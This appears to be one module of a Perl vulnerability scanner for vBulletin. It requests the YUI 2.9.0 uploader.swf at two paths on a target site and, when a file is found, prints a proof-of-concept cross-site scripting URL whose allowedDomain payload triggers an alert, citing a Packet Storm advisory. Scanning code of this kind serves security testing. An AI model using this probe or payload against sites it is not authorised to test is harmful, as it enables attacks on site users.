#vBulletin YUI 2.9.0 XSS
$tfh=0;
print "\n[+] Checking vBulletin YUI 2.9.0 XSS\n";
my $response = $ua->get("$target/clientscript/yui/uploader/assets/uploader.swf");
if ($response->status_line =~ /200/g) {
    print color("yellow");
    print "[++] Uploader.swf is vulnerable \n$target/clientscript/yui/uploader/assets/uploader.swf?allowedDomain=\"})))}catch(e){alert(/XSS/);}//\n POC : https://packetstormsecurity.com/files/124746/vBulletin-YUI-2.9.0-Cross-Site-Scripting.html\n";
    print color("blue");
    $tfh=1;
}
my $response = $ua->get("$target/core/clientscript/yui/uploader/assets/uploader.swf");
if ($response->status_line =~ /200/g) {
    print color("yellow");
    print "[++] Uploader.swf is vulnerable \n$target/core/clientscript/yui/uploader/assets/uploader.swf?allowedDomain=\"})))}catch(e){alert(/XSS/);}//\n POC : https://packetstormsecurity.com/files/124746/vBulletin-YUI-2.9.0-Cross-Site-Scripting.html\n";
    print color("blue");
    $tfh=1;
}
if ($tfh==0){
    print color("red");
    print "[++] Uploader.swf not found :(\n";
    print color("blue");
}
#vBulletin YUI 2.9.0 XSS
